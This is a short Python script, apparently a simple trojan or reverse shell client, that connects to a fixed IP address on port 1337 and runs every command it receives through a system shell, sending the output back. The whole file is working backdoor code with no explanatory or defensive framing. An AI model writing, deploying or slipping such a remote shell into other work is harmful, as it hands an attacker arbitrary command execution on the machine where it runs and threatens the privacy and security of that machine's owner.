#!/usr/bin/env python3
import socket
import subprocess


class JTClient:
    def __init__(self, ip, port):
        self.c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.c.connect((ip, port))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            cmd = self.c.recv(1024).decode('utf-8')
            cmd_result = self.execute_system_command(cmd)
            self.c.send(cmd_result)

        self.c.close()


jTro_client = JTClient("192.168.31.207", 1337)
jTro_client.run()
